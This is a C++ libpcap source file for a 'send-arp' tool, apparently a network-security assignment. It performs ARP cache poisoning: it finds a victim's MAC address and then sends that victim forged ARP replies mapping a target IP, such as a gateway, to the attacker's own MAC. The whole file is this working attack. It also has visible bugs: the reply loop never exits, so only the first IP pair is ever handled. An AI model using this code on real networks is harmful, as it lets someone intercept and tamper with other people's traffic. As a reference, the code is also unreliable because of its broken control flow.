#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <net/if.h>
#include <netinet/in.h>
#include <net/if_arp.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <string.h>
#include <unistd.h>

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

#define Mac_Format "%02x:%02x:%02x:%02x:%02x:%02x"
#define MAC_Addr_Format(addr)  addr[0], addr[1], addr[2], addr[3], addr[4], addr[5]
#define MAC_ALEN 6

void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

int GetMacAddress(char *ifname, uint8_t *mac_addr, char* ipstr)
{
	struct ifreq ifr;
	int sockfd, ret;
	sockfd = socket(AF_INET, SOCK_DGRAM,0);
	if(sockfd<0){
		printf("Fail to get interface MAC address\n");
		return -1;
	}
	strncpy(ifr.ifr_name,ifname,IFNAMSIZ);
	ret = ioctl(sockfd,SIOCGIFHWADDR,&ifr);
	if (ret < 0){
		printf("Fail to get interface MAC address\n");
		return -1;
	}
	memcpy(mac_addr, ifr.ifr_hwaddr.sa_data,MAC_ALEN);
	inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2, ipstr,sizeof(struct sockaddr));
	close(sockfd);
	return 0;
}

/*
Ip get_attacker_ip(char* interface)
{
    struct ifreq ifr;
    char ipstr[40];
    int s;
    s = socket(AF_INET, SOCK_DGRAM, 0);
    strncpy(ifr.ifr_name, interface, IFNAMSIZ);
    if (ioctl(s, SIOCGIFADDR, &ifr) < 0)
    { printf("Error"); }
    inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2, ipstr,sizeof(struct sockaddr));
    return Ip(ipstr);

}*/




int main(int argc, char* argv[]) {
	if (argc%2 != 0) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	uint8_t myMacAddress[MAC_ALEN];
	char myIpAddress[40];
	if(GetMacAddress(argv[1],myMacAddress, myIpAddress)==-1){
		return -1; 
	}
	//Ip myIp = htonl(Ip(myIpAddress));
	//printf(Mac_Format"\n", MAC_Addr_Format(myMacAddress));
	//printf("%s\n",myIp.operator std::string());

	//std::string myIP;
	//myIP = get_attacker_ip(argv[1]).operator std::string();
	//printf("%s",myIP);





	int i;
	for(i=0;i<(argc-2)/2;i++){

		EthArpPacket packet;

		packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
		packet.eth_.smac_ = myMacAddress; 	
		packet.eth_.type_ = htons(EthHdr::Arp);

		packet.arp_.hrd_ = htons(ArpHdr::ETHER);
		packet.arp_.pro_ = htons(EthHdr::Ip4);
		packet.arp_.hln_ = Mac::SIZE;
		packet.arp_.pln_ = Ip::SIZE;
		packet.arp_.op_ = htons(ArpHdr::Request);
		packet.arp_.smac_ = myMacAddress;
		packet.arp_.sip_ = htonl(Ip(argv[2*i+3]));
		packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
		packet.arp_.tip_ = htonl(Ip(argv[2*i+2]));

		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}
		while(1){
			struct pcap_pkthdr* pkt_header;
            const u_char* pkt_data;
            int res = pcap_next_ex(handle, &pkt_header, &pkt_data);
            if (res != 1) continue;
            struct EthArpPacket* check_header = (struct EthArpPacket *)(pkt_data);
            if(check_header->eth_.type_!= htons(EthHdr::Arp)) continue;
            if(check_header->arp_.op_ != htons(ArpHdr::Reply)) continue; 


			EthArpPacket final_packet;
			final_packet.eth_.dmac_ = check_header->arp_.smac_;
			final_packet.eth_.smac_ = myMacAddress; 	
			final_packet.eth_.type_ = htons(EthHdr::Arp);

			final_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
			final_packet.arp_.pro_ = htons(EthHdr::Ip4);
			final_packet.arp_.hln_ = Mac::SIZE;
			final_packet.arp_.pln_ = Ip::SIZE;
			final_packet.arp_.op_ = htons(ArpHdr::Reply);
			final_packet.arp_.smac_ = myMacAddress;
			final_packet.arp_.sip_ = htonl(Ip(argv[2*i+3]));
			final_packet.arp_.tmac_ = check_header->arp_.smac_;
			final_packet.arp_.tip_ = htonl(Ip(argv[2*i+2]));

			int res2 = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&final_packet), sizeof(EthArpPacket));
			if (res2 != 0) {
				fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
			}
	}
	}
	pcap_close(handle);
}
